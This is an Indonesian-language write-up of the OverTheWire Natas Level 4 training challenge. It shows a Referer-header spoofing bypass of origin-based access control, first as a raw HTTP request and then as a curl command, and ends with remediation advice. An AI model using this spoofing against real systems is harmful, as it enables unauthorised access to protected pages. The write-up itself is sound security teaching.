---
title: "Level 4"
description: Memalsukan header Referer untuk melewati kontrol akses berbasis asal.
sidebarTitle: "Level 4 — Spoofing Referer"
---

## Profil

- **Target:** `http://natas4.natas.labs.overthewire.org`
- **Kredensial:** `natas4` / (*password* dari Level 3)

## Pengintaian

Laman menampilkan pesan bahwa akses dibatasi — hanya permintaan yang berasal dari `http://natas5.natas.labs.overthewire.org/` yang diizinkan. Ini merupakan pemeriksaan kontrol akses berbasis asal (*origin-based access control*).

## Analisis

Aplikasi memeriksa header `Referer` di sisi server. Pendekatan ini memiliki sejumlah kelemahan fundamental:

1. Header `Referer` sepenuhnya berada di bawah kendali klien
2. Dapat dimodifikasi dengan mudah menggunakan alat *proxy*
3. Sejumlah *browser* dan perangkat privasi telah menghapus atau memodifikasi header ini sejak awal

## Eksploitasi

Dengan memanfaatkan Burp Suite (atau *proxy* HTTP lainnya), *intercept* permintaan menuju `index.php` dan ubah header `Referer`:

```http
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
Referer: http://natas5.natas.labs.overthewire.org/
```

Alternatif menggunakan `curl`:

```bash
curl -u natas4:$(cat password4) \
  --referer "http://natas5.natas.labs.overthewire.org/" \
  http://natas4.natas.labs.overthewire.org/
```

## Hasil

Server menerima header yang telah dipalsukan dan mengembalikan *password* untuk Level 5.

## Remediasi

- Jangan sekali-kali menggunakan header `Referer` sebagai mekanisme kontrol akses — header ini sangat rentan terhadap pemalsuan
- Gunakan autentikasi berbasis sesi atau *token* kriptografis yang tidak mudah dipalsukan
- Lakukan validasi otorisasi di sisi server melalui mekanisme autentikasi yang tepat
